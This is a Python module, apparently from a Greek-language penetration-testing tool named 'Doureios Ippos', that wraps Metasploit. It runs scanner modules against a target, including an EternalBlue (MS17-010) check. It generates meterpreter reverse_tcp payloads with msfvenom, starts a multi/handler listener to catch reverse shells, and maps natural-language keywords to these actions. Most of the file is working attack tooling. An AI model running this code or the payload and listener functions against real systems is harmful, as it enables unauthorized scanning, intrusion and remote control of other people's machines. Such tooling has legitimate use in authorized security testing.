#!/usr/bin/env python3
"""
Doureios Ippos — Metasploit Integration
Σύνδεση με Metasploit Framework για advanced exploitation
"""

import subprocess
import shutil
import os
import tempfile
from pathlib import Path

# ── Colors ──
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
C = "\033[96m"
D = "\033[2m"
B = "\033[1m"
X = "\033[0m"


def is_metasploit_available() -> bool:
    """Check if Metasploit is installed"""
    return bool(shutil.which("msfconsole"))


def is_msfrpc_running() -> bool:
    """Check if Metasploit RPC is running"""
    try:
        result = subprocess.run(
            ["pgrep", "-f", "msfrpcd"],
            capture_output=True, text=True
        )
        return result.returncode == 0
    except Exception:
        return False


def run_msf_command(commands: list, timeout: int = 120) -> str:
    """
    Run a series of Metasploit commands via msfconsole -x
    commands: list of MSF commands to run
    """
    if not is_metasploit_available():
        return "[✗] Metasploit δεν βρέθηκε. Εγκατάστησε: sudo apt install metasploit-framework"

    # Build command string
    cmd_str = "; ".join(commands) + "; exit"

    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-x", cmd_str],
            capture_output=True, text=True,
            timeout=timeout
        )
        output = result.stdout + result.stderr
        # Clean up MSF banner/noise
        lines = output.split('\n')
        clean = [l for l in lines if not l.startswith('[*] Starting') and
                 'metasploit' not in l.lower()[:20]]
        return '\n'.join(clean).strip()
    except subprocess.TimeoutExpired:
        return "[!] Timeout — η εντολή Metasploit διακόπηκε"
    except Exception as e:
        return f"[✗] Σφάλμα Metasploit: {e}"


def run_msf_script(script_path: str, timeout: int = 300) -> str:
    """Run a Metasploit resource script (.rc file)"""
    if not is_metasploit_available():
        return "[✗] Metasploit δεν βρέθηκε"
    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", script_path],
            capture_output=True, text=True, timeout=timeout
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        return "[!] Timeout"
    except Exception as e:
        return f"[✗] {e}"


# ─────────────────────────────────────────────────────────────
#  COMMON MODULES
# ─────────────────────────────────────────────────────────────

def scan_with_msf(target: str) -> str:
    """Basic Metasploit port/service scan"""
    commands = [
        f"use auxiliary/scanner/portscan/tcp",
        f"set RHOSTS {target}",
        f"set PORTS 21,22,23,25,80,443,445,3389,8080",
        f"set THREADS 10",
        f"run"
    ]
    return run_msf_command(commands, timeout=120)


def check_ms17_010(target: str) -> str:
    """Check for EternalBlue (MS17-010) vulnerability"""
    commands = [
        f"use auxiliary/scanner/smb/smb_ms17_010",
        f"set RHOSTS {target}",
        f"run"
    ]
    return run_msf_command(commands, timeout=60)


def check_smb_vulns(target: str) -> str:
    """Check for SMB vulnerabilities"""
    commands = [
        f"use auxiliary/scanner/smb/smb_version",
        f"set RHOSTS {target}",
        f"run"
    ]
    return run_msf_command(commands, timeout=60)


def http_version_scan(target: str, port: int = 80) -> str:
    """Scan HTTP service version"""
    commands = [
        f"use auxiliary/scanner/http/http_version",
        f"set RHOSTS {target}",
        f"set RPORT {port}",
        f"run"
    ]
    return run_msf_command(commands, timeout=60)


def ssh_version_scan(target: str) -> str:
    """Scan SSH version"""
    commands = [
        f"use auxiliary/scanner/ssh/ssh_version",
        f"set RHOSTS {target}",
        f"run"
    ]
    return run_msf_command(commands, timeout=60)


def ftp_anonymous_login(target: str) -> str:
    """Check for anonymous FTP login"""
    commands = [
        f"use auxiliary/scanner/ftp/anonymous",
        f"set RHOSTS {target}",
        f"run"
    ]
    return run_msf_command(commands, timeout=60)


def generate_payload(
    payload_type: str = "linux/x64/meterpreter/reverse_tcp",
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    output_format: str = "elf",
    output_file: str = "/tmp/payload"
) -> str:
    """Generate a payload using msfvenom"""
    if not shutil.which("msfvenom"):
        return "[✗] msfvenom δεν βρέθηκε"

    output_path = f"{output_file}.{output_format}"
    try:
        result = subprocess.run([
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", output_format,
            "-o", output_path,
            "--quiet"
        ], capture_output=True, text=True, timeout=60)

        if result.returncode == 0:
            return f"[✓] Payload δημιουργήθηκε: {output_path}"
        else:
            return f"[✗] Σφάλμα msfvenom: {result.stderr}"
    except Exception as e:
        return f"[✗] {e}"


def start_listener(lhost: str = "0.0.0.0", lport: int = 4444,
                   payload: str = "linux/x64/meterpreter/reverse_tcp") -> str:
    """Start a Metasploit listener (multi/handler)"""
    commands = [
        f"use exploit/multi/handler",
        f"set PAYLOAD {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        f"set ExitOnSession false",
        f"run -j"
    ]
    return run_msf_command(commands, timeout=10)


# ─────────────────────────────────────────────────────────────
#  NLP INTEGRATION — understand user requests about MSF
# ─────────────────────────────────────────────────────────────

MSF_INTENTS = {
    "ms17_010": {
        "el": ["eternalblue", "ms17-010", "ms17_010", "wannacry", "smb exploit"],
        "en": ["eternalblue", "ms17-010", "ms17_010", "wannacry"],
        "fn": check_ms17_010,
        "needs_target": True,
        "desc_el": "Έλεγχος EternalBlue (MS17-010)",
        "desc_en": "EternalBlue (MS17-010) check",
    },
    "smb_scan": {
        "el": ["smb version", "smb scan", "windows version"],
        "en": ["smb version", "smb scan"],
        "fn": check_smb_vulns,
        "needs_target": True,
        "desc_el": "SMB version scan",
        "desc_en": "SMB version scan",
    },
    "http_scan": {
        "el": ["http version", "web server version", "apache version", "nginx version"],
        "en": ["http version", "web server version"],
        "fn": http_version_scan,
        "needs_target": True,
        "desc_el": "HTTP version scan",
        "desc_en": "HTTP version scan",
    },
    "ssh_scan": {
        "el": ["ssh version", "openssh version"],
        "en": ["ssh version", "openssh version"],
        "fn": ssh_version_scan,
        "needs_target": True,
        "desc_el": "SSH version scan",
        "desc_en": "SSH version scan",
    },
    "ftp_anon": {
        "el": ["anonymous ftp", "ftp login", "ftp ανώνυμος"],
        "en": ["anonymous ftp", "ftp login", "ftp anonymous"],
        "fn": ftp_anonymous_login,
        "needs_target": True,
        "desc_el": "FTP anonymous login check",
        "desc_en": "FTP anonymous login check",
    },
    "msf_scan": {
        "el": ["metasploit scan", "msf scan", "σάρωση metasploit"],
        "en": ["metasploit scan", "msf scan"],
        "fn": scan_with_msf,
        "needs_target": True,
        "desc_el": "Metasploit port scan",
        "desc_en": "Metasploit port scan",
    },
}


def detect_msf_intent(text: str, target: str = "") -> dict | None:
    """Detect if user wants a Metasploit action"""
    text_lower = text.lower()
    for intent_id, intent in MSF_INTENTS.items():
        for pattern in intent["el"] + intent["en"]:
            if pattern in text_lower:
                return {
                    "id": intent_id,
                    "fn": intent["fn"],
                    "needs_target": intent["needs_target"],
                    "target": target,
                    "desc_el": intent["desc_el"],
                    "desc_en": intent["desc_en"],
                }
    return None


if __name__ == "__main__":
    print(f"Metasploit available: {is_metasploit_available()}")
    if is_metasploit_available():
        print("Testing SSH version scan on localhost...")
        out = ssh_version_scan("127.0.0.1")
        print(out)
